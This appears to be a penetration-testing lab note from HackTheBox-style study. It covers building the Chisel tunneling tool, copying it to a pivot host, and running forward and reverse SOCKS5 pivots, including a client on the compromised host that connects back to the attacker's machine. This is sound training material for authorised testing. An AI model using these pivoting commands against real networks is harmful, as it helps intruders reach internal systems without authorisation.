
---
[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH.
### Setting Up
#### Go env
```bash
wget https://golang.org/dl/go1.22.2.linux-amd64.tar.gz
```

```bash
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.22.2.linux-amd64.tar.gz
```

```bash
~/.zshrc
# Go Environment Configurations
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$GOPATH/bin:$PATH
```
#### Cloning Chisel
```bash
git clone https://github.com/jpillora/chisel.git
```
**Note:** Depending on the version of the `glibc`(GUN　 C Library) library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.

Error message:
```bash
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found
```
#### Building the Chisel Binary
```bash
cd chisel
```

```bash
go mod download
```
Make it statically linked to avoid discrepancies
```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_prod
```
Check the resoult
```bash
hcx05@htb[/htb/chisel]$ file chisel_prod

chisel_prod: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```
Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)"
#### Transferring Chisel Binary
```bash
hcx05@htb[/htb]$ scp chisel_prod ubuntu@[Pivot host ip]:~/
```
#### Running the Chisel Server on the Pivot Host
```bash
ubuntu@WEB01:~$ ./chisel_prod server -p 443 --socks5
```
#### Connecting to the Chisel Server
```bash
hcx05@htb[/htb]$ ./chisel_prod client -v [Pivot host ip]:443 socks
```
Then, eddit `/etc/proxychains.conf`
### Reverse Pivot
#### Starting the Chisel Server on our Attack Host
```bash
hcx05@htb[/htb]$ sudo ./chisel_prod server --reverse -v -p 1234 --socks5
```
#### Connecting the Chisel Client to our Attack Host
```bash
ubuntu@WEB01$ ./chisel_prod client -v 10.10.14.17:1234 R:socks
```
When we specify the target ip and port, we don't need to configurate `proxychains.conf`. 
```bash
ubuntu@WEB01$ ./chisel_prod client -v 10.10.14.17:1234 R:[target ip]:[target port]
```









































